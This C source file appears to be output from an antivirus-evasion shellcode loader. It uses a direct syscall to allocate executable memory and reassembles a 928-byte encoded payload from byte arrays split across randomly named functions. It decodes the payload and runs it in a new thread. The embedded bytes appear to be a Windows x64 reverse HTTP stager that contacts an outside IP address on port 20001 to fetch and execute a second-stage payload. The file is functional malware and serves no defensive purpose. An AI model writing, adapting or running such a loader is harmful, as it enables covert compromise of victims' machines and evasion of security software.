#include <windows.h>

#define SBAV_ROL4(v) (v << 4 | v >> 4)

unsigned char *SBAV_Shellcode = NULL;

DWORD SBAV_ShellcodeSize = 928;

EXTERN_C DWORD SBAV_NtAllocateVirtualMemorySyscallNumber = 0x15;

// ---------------------------------------------------------------------------------
// 函数声明
// ---------------------------------------------------------------------------------

EXTERN_C NTSTATUS SBAV_NtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);

void SBAV_InitShellcode();

// ---------------------------------------------------------------------------------
// 函数实现
// ---------------------------------------------------------------------------------

#ifdef OS_AUTO_DETECT
void SBAV_InitNtAllocateVirtualMemorySyscallNumber()
{
	typedef NTSTATUS(WINAPI *SBAV_Type_RtlGetVersion)(LPOSVERSIONINFOEXW);
	SBAV_Type_RtlGetVersion SBAV_RtlGetVersion;
	OSVERSIONINFOEXW OsInfo;
	DWORD MajorVersion = 0;
	DWORD MinorVersion = 0;
	SBAV_RtlGetVersion = (SBAV_Type_RtlGetVersion)GetProcAddress(GetModuleHandleA("ntdll"), "RtlGetVersion");
	OsInfo.dwOSVersionInfoSize = sizeof(OsInfo);
	SBAV_RtlGetVersion(&OsInfo);
	MajorVersion = OsInfo.dwMajorVersion;
	MinorVersion = OsInfo.dwMinorVersion;
	if (MajorVersion == 6)
	{
		switch (MinorVersion)
		{
		case 0:
		case 1:
			SBAV_NtAllocateVirtualMemorySyscallNumber = 0x15;
			break;
		case 2:
			SBAV_NtAllocateVirtualMemorySyscallNumber = 0x16;
			break;
		case 3:
			SBAV_NtAllocateVirtualMemorySyscallNumber = 0x17;
			break;
		}
	}
	else if (MajorVersion == 10)
	{
		SBAV_NtAllocateVirtualMemorySyscallNumber = 0x18;
	}
	else
	{
		exit(1);
	}
}
#endif

void SBAV_ReverseEncrypt(unsigned char *Data, unsigned long Length)
{
    unsigned char temp;
    for (unsigned long i = 0; i < Length; i++)
    {
        temp = Data[i];
        Data[i] = Data[Length - i - 1];
        Data[Length - i - 1] = temp;
        Data[i] = SBAV_ROL4(Data[i]);
        Data[Length - i - 1] = SBAV_ROL4(Data[Length - i - 1]);
    }
}

int SBAV_AntiSandbox()
{
	return 0;
}

// 入口函数，引用头文件后调用这个函数
int SBAV_StartShellcode()
{
	PVOID BaseAddress = NULL;
	SIZE_T RegionSize = SBAV_ShellcodeSize;	

	// 反沙箱
	SBAV_AntiSandbox();

	// 动态获取调用号
#ifdef OS_AUTO_DETECT
	SBAV_InitNtAllocateVirtualMemorySyscallNumber();
#endif

	SBAV_NtAllocateVirtualMemory((HANDLE)0xFFFFFFFFFFFFFFFF, &BaseAddress, 0, &RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	SBAV_Shellcode = (unsigned char *)BaseAddress;

	// 写入shellcode
	SBAV_InitShellcode();

	// 解密
	SBAV_ReverseEncrypt((unsigned char *)BaseAddress, SBAV_ShellcodeSize);

	// 执行 shellcode
	//((LPTHREAD_START_ROUTINE)BaseAddress)(0);

	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)BaseAddress, 0, 0, 0);

	while (1)
	{
		Sleep(10000);
	}

	return 0;
}
void qrDPRciKnuRmNFqOWYR();
void cxRXkfGAMPvPqbCiqEo();
void wSQlIhBBMPlrkAiFDno();
void iSrwykyxCwnNkvMrPVW();
void sELOpLNipBOwzvrnIze();
void pBiosybYHoHdbEdXfSv();
void rMSHCPwveSCLsAudYLC();
void mHCfWayLbpFmbckIkat();
void SgjbmBfPgNOMOBNkHLM();
void FbHjdUWAXBkoySmTDpk();
void JaKviyllfEFzeadQDhR();
void AbIOQdyefGQaXfMMqGe();
void hItcoUgubSGCjGuKjyJ();
void pxWSiivuWnqjXVrrITW();
void RdcEUHHIMLkwhmMBtbl();
void NgfUMFrcTJQFoYrFOwd();
void CmRUSAlKCTIflgVjWRj();
void IjuKAoOvctXueNxvOVe();
void dPOnRLBtyBLhxObFEtj();
void DaYXIUtXujRajGhvRXv();
void hwrhMYQzzCrptSALCDa();
void hwrhMYQzzCrptSALCDa()
{
	unsigned char Data[7] = {0x36, 0x32, 0x00, 0x6f, 0xaa, 0x51, 0xc3, };
	memcpy(SBAV_Shellcode + 921, Data, 7);
	iSrwykyxCwnNkvMrPVW();
	JaKviyllfEFzeadQDhR();
	rMSHCPwveSCLsAudYLC();
}
void iSrwykyxCwnNkvMrPVW()
{
	unsigned char Data[55] = {0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, };
	memcpy(SBAV_Shellcode + 119, Data, 55);
	FbHjdUWAXBkoySmTDpk();
	qrDPRciKnuRmNFqOWYR();
}
void JaKviyllfEFzeadQDhR()
{
	unsigned char Data[48] = {0x72, 0x30, 0x3b, 0x4f, 0x2b, 0x63, 0x45, 0x88, 0x9a, 0xd8, 0x7c, 0x19, 0x01, 0xa3, 0xf6, 0xdc, 0x76, 0xc7, 0x53, 0x02, 0x7d, 0x41, 0x1b, 0x8c, 0xed, 0x49, 0xcd, 0x23, 0xe1, 0xad, 0xd2, 0x3c, 0xae, 0x91, 0xa6, 0x36, 0x2e, 0x23, 0x20, 0x0d, 0x94, 0x6e, 0x10, 0xd9, 0x1a, 0x09, 0x1e, 0xcb, };
	memcpy(SBAV_Shellcode + 431, Data, 48);
	RdcEUHHIMLkwhmMBtbl();
	NgfUMFrcTJQFoYrFOwd();
	hItcoUgubSGCjGuKjyJ();
	cxRXkfGAMPvPqbCiqEo();
}
void rMSHCPwveSCLsAudYLC()
{
	unsigned char Data[41] = {0x50, 0x41, 0xba, 0x3a, 0x56, 0x79, 0xa7, 0xff, 0xd5, 0xe9, 0x93, 0x00, 0x00, 0x00, 0x5a, 0x48, 0x89, 0xc1, 0x41, 0xb8, 0x21, 0x4e, 0x00, 0x00, 0x4d, 0x31, 0xc9, 0x41, 0x51, 0x41, 0x51, 0x6a, 0x03, 0x41, 0x51, 0x41, 0xba, 0x57, 0x89, 0x9f, 0xc6, };
	memcpy(SBAV_Shellcode + 254, Data, 41);
	AbIOQdyefGQaXfMMqGe();
	CmRUSAlKCTIflgVjWRj();
}
void FbHjdUWAXBkoySmTDpk()
{
	unsigned char Data[39] = {0x18, 0x7b, 0xff, 0xd5, 0x85, 0xc0, 0x0f, 0x85, 0x9d, 0x01, 0x00, 0x00, 0x48, 0xff, 0xcf, 0x0f, 0x84, 0x8c, 0x01, 0x00, 0x00, 0xeb, 0xb3, 0xe9, 0xe4, 0x01, 0x00, 0x00, 0xe8, 0x82, 0xff, 0xff, 0xff, 0x2f, 0x46, 0x53, 0x78, 0x4c, 0x00, };
	memcpy(SBAV_Shellcode + 392, Data, 39);
	pxWSiivuWnqjXVrrITW();
	SgjbmBfPgNOMOBNkHLM();
	sELOpLNipBOwzvrnIze();
	dPOnRLBtyBLhxObFEtj();
}
void qrDPRciKnuRmNFqOWYR()
{
	unsigned char Data[35] = {0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc8, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, };
	memcpy(SBAV_Shellcode + 0, Data, 35);
	IjuKAoOvctXueNxvOVe();
	DaYXIUtXujRajGhvRXv();
}
void RdcEUHHIMLkwhmMBtbl()
{
	unsigned char Data[61] = {0x4b, 0x86, 0xe0, 0x99, 0x90, 0x1b, 0x3d, 0xa6, 0xca, 0x02, 0xd4, 0xb3, 0x07, 0x47, 0xe0, 0x53, 0xeb, 0x1d, 0x9c, 0xbf, 0x73, 0x87, 0xae, 0xc9, 0xb9, 0x52, 0xd3, 0xab, 0x12, 0x53, 0x6d, 0xfd, 0x2e, 0xf0, 0xbe, 0x3b, 0x49, 0x5b, 0xb0, 0x40, 0xf5, 0x7e, 0xbd, 0xb4, 0x71, 0x5c, 0x2b, 0x6d, 0x9c, 0xeb, 0x5d, 0xcc, 0x63, 0x2f, 0xd0, 0xbf, 0x8b, 0xfe, 0x4f, 0x7e, 0x5f, };
	memcpy(SBAV_Shellcode + 618, Data, 61);
	pBiosybYHoHdbEdXfSv();
	wSQlIhBBMPlrkAiFDno();
	mHCfWayLbpFmbckIkat();
}
void NgfUMFrcTJQFoYrFOwd()
{
	unsigned char Data[52] = {0x67, 0x84, 0xc0, 0x65, 0x7d, 0x99, 0x85, 0xc2, 0x17, 0x70, 0x2f, 0x52, 0xe7, 0x66, 0x3d, 0x0c, 0xf4, 0x27, 0x0f, 0x8f, 0x69, 0x1b, 0xbf, 0xd7, 0xa6, 0x4b, 0x02, 0x00, 0x4e, 0x29, 0x34, 0x9b, 0xea, 0x77, 0xf4, 0x79, 0xeb, 0xde, 0xe3, 0xd9, 0x96, 0x11, 0x0f, 0x87, 0x2a, 0x79, 0xc4, 0x92, 0xb9, 0x35, 0x69, 0xbf, };
	memcpy(SBAV_Shellcode + 679, Data, 52);
}
void hItcoUgubSGCjGuKjyJ()
{
	unsigned char Data[33] = {0x3b, 0x20, 0x4d, 0x53, 0x49, 0x45, 0x20, 0x37, 0x2e, 0x30, 0x3b, 0x20, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x4e, 0x54, 0x20, 0x35, 0x2e, 0x31, 0x3b, 0x20, 0x54, 0x72, 0x69, 0x64, 0x65, };
	memcpy(SBAV_Shellcode + 540, Data, 33);
}
void cxRXkfGAMPvPqbCiqEo()
{
	unsigned char Data[52] = {0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x66, 0x81, 0x78, 0x18, 0x0b, 0x02, 0x75, 0x72, 0x8b, 0x80, };
	memcpy(SBAV_Shellcode + 35, Data, 52);
}
void AbIOQdyefGQaXfMMqGe()
{
	unsigned char Data[61] = {0x02, 0x09, 0xe1, 0x38, 0x67, 0xaa, 0xc7, 0x17, 0x41, 0x40, 0x0c, 0x61, 0xf6, 0x67, 0x9c, 0xc7, 0xb0, 0x8c, 0xda, 0x6a, 0xbe, 0xb9, 0xf8, 0x5d, 0x07, 0x00, 0x55, 0x73, 0x65, 0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a, 0x20, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x34, 0x2e, 0x30, 0x20, 0x28, 0x63, 0x6f, 0x6d, 0x70, 0x61, 0x74, 0x69, 0x62, 0x6c, 0x65, };
	memcpy(SBAV_Shellcode + 479, Data, 61);
}
void CmRUSAlKCTIflgVjWRj()
{
	unsigned char Data[36] = {0x16, 0x3e, 0x51, 0x9c, 0xa8, 0xa3, 0x4a, 0x08, 0xa1, 0xf0, 0x22, 0xf6, 0xd3, 0x1c, 0xed, 0x99, 0xd6, 0xb3, 0x94, 0xf5, 0x8e, 0x9a, 0x10, 0xb9, 0x56, 0xa9, 0xb0, 0x00, 0x57, 0x7f, 0xb7, 0x5c, 0x49, 0xea, 0x8f, 0xca, };
	memcpy(SBAV_Shellcode + 731, Data, 36);
}
void pxWSiivuWnqjXVrrITW()
{
	unsigned char Data[45] = {0x6e, 0x74, 0x2f, 0x34, 0x2e, 0x30, 0x29, 0x0d, 0x0a, 0x00, 0xd4, 0xa2, 0xde, 0x9e, 0x31, 0x52, 0x6a, 0xa9, 0xdd, 0x31, 0x9b, 0x39, 0x24, 0x46, 0x2a, 0x62, 0x33, 0x74, 0xc4, 0xb7, 0x0f, 0x90, 0x51, 0x9d, 0xfe, 0x45, 0x84, 0x6c, 0x07, 0x44, 0xde, 0xfc, 0x45, 0xce, 0x1c, };
	memcpy(SBAV_Shellcode + 573, Data, 45);
}
void SgjbmBfPgNOMOBNkHLM()
{
	unsigned char Data[48] = {0x00, 0x00, 0x6a, 0x00, 0x68, 0x80, 0x33, 0x00, 0x00, 0x49, 0x89, 0xe0, 0x41, 0xb9, 0x04, 0x00, 0x00, 0x00, 0x41, 0xba, 0x75, 0x46, 0x9e, 0x86, 0xff, 0xd5, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x49, 0xc7, 0xc0, 0xff, 0xff, 0xff, 0xff, 0x4d, 0x31, 0xc9, 0x52, 0x52, 0x41, 0xba, 0x2d, 0x06, };
	memcpy(SBAV_Shellcode + 344, Data, 48);
}
void sELOpLNipBOwzvrnIze()
{
	unsigned char Data[41] = {0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x4f, 0xff, 0xff, 0xff, 0x5d, 0x6a, 0x00, 0x49, 0xbe, };
	memcpy(SBAV_Shellcode + 174, Data, 41);
}
void dPOnRLBtyBLhxObFEtj()
{
	unsigned char Data[57] = {0x31, 0xc9, 0xba, 0x00, 0x00, 0x40, 0x00, 0x41, 0xb8, 0x00, 0x10, 0x00, 0x00, 0x41, 0xb9, 0x40, 0x00, 0x00, 0x00, 0x41, 0xba, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x48, 0x93, 0x53, 0x53, 0x48, 0x89, 0xe7, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x41, 0xb8, 0x00, 0x20, 0x00, 0x00, 0x49, 0x89, 0xf9, 0x41, 0xba, 0x12, 0x96, 0x89, 0xe2, 0xff, 0xd5, };
	memcpy(SBAV_Shellcode + 818, Data, 57);
}
void IjuKAoOvctXueNxvOVe()
{
	unsigned char Data[51] = {0x34, 0xdf, 0x1d, 0xf8, 0x51, 0x5d, 0xe7, 0x37, 0x63, 0x7f, 0x9a, 0xab, 0x99, 0x82, 0xe5, 0x17, 0x81, 0xc6, 0x2d, 0x03, 0xe6, 0xce, 0x06, 0xbb, 0xa4, 0x87, 0x25, 0xa8, 0x41, 0xc2, 0x16, 0x4c, 0x21, 0xb3, 0x97, 0x4d, 0x77, 0x52, 0x9e, 0x43, 0x4f, 0x00, 0x41, 0xbe, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x48, };
	memcpy(SBAV_Shellcode + 767, Data, 51);
}
void DaYXIUtXujRajGhvRXv()
{
	unsigned char Data[46] = {0x48, 0x83, 0xc4, 0x20, 0x85, 0xc0, 0x74, 0xb6, 0x66, 0x8b, 0x07, 0x48, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xd7, 0x58, 0x58, 0x58, 0x48, 0x05, 0x00, 0x00, 0x00, 0x00, 0x50, 0xc3, 0xe8, 0x7f, 0xfd, 0xff, 0xff, 0x31, 0x32, 0x30, 0x2e, 0x35, 0x33, 0x2e, 0x31, 0x32, 0x35, 0x2e, 0x31, };
	memcpy(SBAV_Shellcode + 875, Data, 46);
}
void pBiosybYHoHdbEdXfSv()
{
	unsigned char Data[39] = {0x77, 0x69, 0x6e, 0x69, 0x6e, 0x65, 0x74, 0x00, 0x41, 0x56, 0x49, 0x89, 0xe6, 0x4c, 0x89, 0xf1, 0x41, 0xba, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0x48, 0x31, 0xd2, 0x4d, 0x31, 0xc0, 0x4d, 0x31, 0xc9, 0x41, 0x50, 0x41, };
	memcpy(SBAV_Shellcode + 215, Data, 39);
}
void wSQlIhBBMPlrkAiFDno()
{
	unsigned char Data[32] = {0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, };
	memcpy(SBAV_Shellcode + 87, Data, 32);
}
void mHCfWayLbpFmbckIkat()
{
	unsigned char Data[49] = {0xff, 0xd5, 0xeb, 0x79, 0x5b, 0x48, 0x89, 0xc1, 0x48, 0x31, 0xd2, 0x49, 0x89, 0xd8, 0x4d, 0x31, 0xc9, 0x52, 0x68, 0x00, 0x32, 0xc0, 0x84, 0x52, 0x52, 0x41, 0xba, 0xeb, 0x55, 0x2e, 0x3b, 0xff, 0xd5, 0x48, 0x89, 0xc6, 0x48, 0x83, 0xc3, 0x50, 0x6a, 0x0a, 0x5f, 0x48, 0x89, 0xf1, 0xba, 0x1f, 0x00, };
	memcpy(SBAV_Shellcode + 295, Data, 49);
}
void SBAV_InitShellcode()
{
	hwrhMYQzzCrptSALCDa();
}
